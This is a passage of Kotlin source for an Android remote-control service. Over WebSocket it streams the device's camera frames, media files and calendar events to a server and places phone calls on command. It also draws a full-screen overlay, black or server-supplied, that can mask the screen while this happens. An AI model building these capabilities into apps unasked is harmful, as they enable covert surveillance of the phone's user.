                        val sc = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
                        if (nc >= 0) name = c.getString(nc) ?: name
                        if (mc >= 0) mime = c.getString(mc) ?: mime
                        if (sc >= 0) fileSize = c.getLong(sc)
                    }
                }
            } catch (e: Exception) { err("query: ${e.javaClass.simpleName}: ${e.message}"); return }
            if (fileSize <= 0L) {
                try { contentResolver.openFileDescriptor(contentUri, "r")?.use { pfd -> fileSize = pfd.statSize } } catch (ignored: Exception) {}
            }
            if (fileSize <= 0L) { err("Размер=0 (id=$id type=$mediaType)"); return }
            val chunkSize = 2 * 1024 * 1024
            val totalChunks = ((fileSize + chunkSize - 1) / chunkSize).toInt().coerceAtLeast(1)
            Thread {
                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_FOREGROUND)
                try {
                    contentResolver.openInputStream(contentUri)?.use { stream ->
                        val buf = ByteArray(chunkSize); var index = 0
                        while (true) {
                            var read = 0
                            while (read < buf.size) { val r = stream.read(buf, read, buf.size - read); if (r <= 0) break; read += r }
                            if (read <= 0) break
                            sendChunkBinary(ws, requestId, index, totalChunks, name, mime, fileSize, buf, read)
                            index++
                            while (ws.queueSize() > 4 * 1024 * 1024) Thread.sleep(10)
                        }
                    } ?: err("openInputStream вернул null")
                } catch (e: Exception) { err("stream: ${e.javaClass.simpleName}: ${e.message}") }
            }.apply { isDaemon = true }.start()
        } catch (e: Exception) { err("sendMediaFile: ${e.javaClass.simpleName}: ${e.message}") }
    }

    private fun sendCalendarEvents(days: Int, ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type","calendar-events").put("err","Нет разрешения на чтение календаря").toString()); return
        }
        try {
            val now = System.currentTimeMillis()
            val end = now + days.coerceIn(1, 365) * 24L * 3600 * 1000
            val projection = arrayOf(
                CalendarContract.Events._ID, CalendarContract.Events.TITLE,
                CalendarContract.Events.DTSTART, CalendarContract.Events.DTEND,
                CalendarContract.Events.ALL_DAY, CalendarContract.Events.EVENT_LOCATION,
                CalendarContract.Calendars.CALENDAR_DISPLAY_NAME
            )
            val events = JSONArray()
            contentResolver.query(
                CalendarContract.Events.CONTENT_URI, projection,
                "${CalendarContract.Events.DTSTART} >= ? AND ${CalendarContract.Events.DTSTART} <= ? AND ${CalendarContract.Events.DELETED} = 0",
                arrayOf(now.toString(), end.toString()),
                "${CalendarContract.Events.DTSTART} ASC"
            )?.use { c ->
                val idCol     = c.getColumnIndexOrThrow(CalendarContract.Events._ID)
                val titleCol  = c.getColumnIndexOrThrow(CalendarContract.Events.TITLE)
                val startCol  = c.getColumnIndexOrThrow(CalendarContract.Events.DTSTART)
                val endCol    = c.getColumnIndexOrThrow(CalendarContract.Events.DTEND)
                val allDayCol = c.getColumnIndexOrThrow(CalendarContract.Events.ALL_DAY)
                val locCol    = c.getColumnIndexOrThrow(CalendarContract.Events.EVENT_LOCATION)
                val calCol    = c.getColumnIndex(CalendarContract.Calendars.CALENDAR_DISPLAY_NAME)
                var count = 0
                while (c.moveToNext() && count < 50) {
                    val e = JSONObject()
                    e.put("id", c.getLong(idCol))
                    e.put("title", c.getString(titleCol) ?: "(Без названия)")
                    e.put("dtstart", c.getLong(startCol))
                    e.put("dtend", c.getLong(endCol))
                    e.put("allDay", c.getInt(allDayCol) == 1)
                    val loc = c.getString(locCol)
                    if (!loc.isNullOrBlank()) e.put("location", loc)
                    if (calCol >= 0) { val cal = c.getString(calCol); if (!cal.isNullOrBlank()) e.put("calendar", cal) }
                    events.put(e)
                    count++
                }
            }
            ws.send(JSONObject().put("type","calendar-events").put("events",events).put("days",days).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type","calendar-events").put("err", e.message ?: "ошибка").toString())
        }
    }

    private fun makeCall(number: String, ws: WebSocket) {
        fun status(ok: Boolean, msg: String) =
            ws.send(JSONObject().put("type", "call-status").put("ok", ok).put("msg", msg).toString())
        if (number.isBlank()) { status(false, "Номер не указан"); return }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE)
            != PackageManager.PERMISSION_GRANTED) { status(false, "Нет разрешения на звонок"); return }
        val cleaned = number.trim()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val telecom = getSystemService(TELECOM_SERVICE) as? android.telecom.TelecomManager
                if (telecom != null) {
                    telecom.placeCall(Uri.fromParts("tel", cleaned, null), android.os.Bundle())
                } else {
                    val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$cleaned"))
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                }
            } else {
                val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$cleaned"))
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            }
            status(true, "Звонок на $cleaned…")
        } catch (e: Exception) {
            status(false, "Ошибка: ${e.message ?: "неизвестная"}")
        }
    }

    // ── CameraX binding & switching ────────────────────────────────────────

    private fun sendCamStatus(text: String) {
        val msg = JSONObject().put("type", "cam-status").put("text", text).toString()
        val ws = if (currentCam == "front") (wsFront ?: wsBack) else wsBack
        ws?.send(msg)
    }

    private fun bindCamera() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            updateNotification("Нет разрешения камеры")
            sendCamStatus("Нет разрешения камеры — выдай его в Настройки → Приложения")
            return
        }
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                val provider = future.get()
                cameraProvider = provider
                bindCameraInternal(provider)
            } catch (e: Exception) {
                val msg = "Провайдер камеры: ${e.message?.take(60)}"
                updateNotification(msg)
                sendCamStatus(msg)
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun bindCameraInternal(provider: ProcessCameraProvider) {
        try {
            provider.unbindAll()
            frameErrorReported = false
            updateNotification("Подключение камеры…")
            sendCamStatus("Открытие камеры…")
            val isFront = currentCam == "front"
            val selector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA
                           else CameraSelector.DEFAULT_BACK_CAMERA
            val analysis = ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()
            val camRef = currentCam
            analysis.setAnalyzer(analyzerExecutor) { proxy ->
                sendFrame(proxy,
                    if (camRef == "front") wsFront else wsBack,
                    if (camRef == "front") lastFrameFrontArr else lastFrameBackArr)
            }
            provider.bindToLifecycle(lifecycleOwner, selector, analysis)
            updateNotification("Идёт трансляция")
            sendCamStatus("ok")
        } catch (e: Exception) {
            val msg = "Ошибка камеры: ${e.message?.take(60)}"
            updateNotification(msg)
            sendCamStatus(msg)
        }
    }

    private fun switchCamera(cam: String) {
        currentCam = cam
        if (cam == "front" && wsFront == null) connectFrontCamWs()
        val provider = cameraProvider ?: return
        ContextCompat.getMainExecutor(this).execute { bindCameraInternal(provider) }
    }

    // ── Frame helpers ──────────────────────────────────────────────────────

    private fun sendFrame(proxy: ImageProxy, target: WebSocket?, lastArr: LongArray) {
        try {
            if (paused) return
            val now = System.currentTimeMillis()
            val ws = target ?: return
            if (now - lastArr[0] < 33 || ws.queueSize() > 512 * 1024) return
            lastArr[0] = now
            val bitmap = proxy.toBitmap()
            val rotated = try {
                val m = Matrix().apply { postRotate(proxy.imageInfo.rotationDegrees.toFloat()) }
                Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, m, true)
                    .also { bitmap.recycle() }
            } catch (e: Exception) { bitmap.recycle(); throw e }
            val scale = minOf(1f, 720f / maxOf(rotated.width, rotated.height))
            val final = if (scale < 1f)
                try {
                    Bitmap.createScaledBitmap(rotated, (rotated.width * scale).toInt(), (rotated.height * scale).toInt(), true)
                        .also { rotated.recycle() }
                } catch (e: Exception) { rotated.recycle(); throw e }
            else rotated
            try {
                val out = ByteArrayOutputStream()
                final.compress(Bitmap.CompressFormat.JPEG, 55, out)
                ws.send(out.toByteArray().toByteString())
                frameErrorReported = false
            } finally {
                final.recycle()
            }
        } catch (e: Exception) {
            if (!frameErrorReported) {
                frameErrorReported = true
                sendCamStatus("Ошибка кадра: ${e.message?.take(50) ?: e.javaClass.simpleName}")
            }
        } finally {
            proxy.close()
        }
    }

    // ── Lifecycle ──────────────────────────────────────────────────────────

    private fun showOverlay() {
        if (overlayView != null) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return
        Handler(Looper.getMainLooper()).post {
            if (overlayView != null) return@post  // double-check: another call may have run first
            try {
                val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
                val params = android.view.WindowManager.LayoutParams(
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    android.view.WindowManager.LayoutParams.FLAG_SECURE,
                    PixelFormat.TRANSLUCENT
                )
                val mediaFile = overlayMediaFile
                val mediaMime = overlayMediaMime
                val view: android.view.View = when {
                    mediaFile != null && mediaMime.startsWith("image/") -> {
                        android.widget.ImageView(this).apply {
                            scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
                            setImageBitmap(android.graphics.BitmapFactory.decodeFile(mediaFile.absolutePath))
                            setBackgroundColor(android.graphics.Color.BLACK)
                        }
                    }
                    mediaFile != null && mediaMime.startsWith("video/") -> {
                        android.view.TextureView(this).apply {
                            surfaceTextureListener = object : android.view.TextureView.SurfaceTextureListener {
                                override fun onSurfaceTextureAvailable(st: android.graphics.SurfaceTexture, w: Int, h: Int) {
                                    try {
                                        val mp = android.media.MediaPlayer().also { overlayMediaPlayer = it }
                                        mp.setDataSource(mediaFile.absolutePath)
                                        mp.setSurface(android.view.Surface(st))
                                        mp.isLooping = true
                                        mp.prepare()
                                        mp.start()
                                    } catch (_: Exception) {}
                                }
                                override fun onSurfaceTextureSizeChanged(st: android.graphics.SurfaceTexture, w: Int, h: Int) {}
                                override fun onSurfaceTextureDestroyed(st: android.graphics.SurfaceTexture): Boolean {
                                    overlayMediaPlayer?.release(); overlayMediaPlayer = null; return true
                                }
                                override fun onSurfaceTextureUpdated(st: android.graphics.SurfaceTexture) {}
                            }
                        }
                    }
                    else -> android.view.View(this).apply {
                        setBackgroundColor(android.graphics.Color.BLACK)
                    }
                }
                wm.addView(view, params)
                overlayView = view
                overlayParams = params
                ControlService.overlayLocked = true
            } catch (_: Exception) {}
        }
    }

    private fun handleSetOverlayMedia(json: JSONObject) {
        val token = json.optString("token").takeIf { it.isNotEmpty() } ?: return
        val mime = json.optString("mime", "image/jpeg")
        val base = serverHttpBase
        if (base.isEmpty()) return
        screenExecutor.execute {
            try {
                val resp = http.newCall(Request.Builder().url("$base/api/overlay-media?token=$token").build()).execute()
                if (!resp.isSuccessful) return@execute
                val file = File(filesDir, "overlay_media")
                resp.body?.byteStream()?.use { input -> file.outputStream().use { input.copyTo(it) } }
                overlayMediaFile = file
                overlayMediaMime = mime
                // Refresh overlay if currently visible
                if (overlayView != null) {
                    hideOverlay()
                    showOverlay()
                }
            } catch (_: Exception) {}
        }
    }

    private fun hideOverlay() {
        val v = overlayView ?: return
        overlayView = null
        overlayParams = null
        ControlService.overlayLocked = false
        overlayMediaPlayer?.release(); overlayMediaPlayer = null
        Handler(Looper.getMainLooper()).post {
            try {
                (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).removeView(v)
            } catch (_: Exception) {}
        }
    }

    private fun disconnect() {
        cameraProvider?.unbindAll(); cameraProvider = null
        wsBack?.close(1000, "stop");   wsBack = null
        wsFront?.close(1000, "stop");  wsFront = null
        wsAudio?.close(1000, "stop");  wsAudio = null
        wsScreen?.close(1000, "stop"); wsScreen = null
        wsPhone?.close(1000, "stop");  wsPhone = null
        stopAudioCapture()
        stopAccessibilityCapture()
        releaseVirtualDisplay()
        hideOverlay()
        mediaProjection?.stop(); mediaProjection = null
        hasProjection = false
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        instance = null
        disconnect()
        lifecycleOwner.stop()
        analyzerExecutor.shutdown()
        wakeLock?.release()
    }

    override fun onBind(intent: Intent?) = null

    private fun startForegroundCompat() {
        val notif = buildNotification("Подключение…")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, buildForegroundType())
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    // Пересчитываем тип foreground сервиса под текущие разрешения и пере-объявляем.
    // Вызывается при каждом ACTION_START чтобы подхватить разрешения выданные после запуска сервиса.
    private fun refreshForegroundType() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
        try { startForeground(NOTIF_ID, buildNotification(statusText), buildForegroundType()) } catch (_: Exception) {}
    }

    private fun buildForegroundType(): Int {
        var type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        return type
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val ch = NotificationChannel(CHANNEL_ID, "Трансляция камеры", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotification(text: String): Notification {
        val pi = PendingIntent.getActivity(this, 0,
            Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Android Remote Panel")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String) {
        statusText = text
        getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
    }
}

class StreamingLifecycleOwner : LifecycleOwner {
    private val registry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = registry
    fun start() {
        Handler(Looper.getMainLooper()).post {
            registry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_START)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
        }
    }
    fun stop() {
        Handler(Looper.getMainLooper()).post {
            registry.handleLifecycleEvent(Lifecycle.Event.ON_PAUSE)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_STOP)
            registry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        }
    }
}
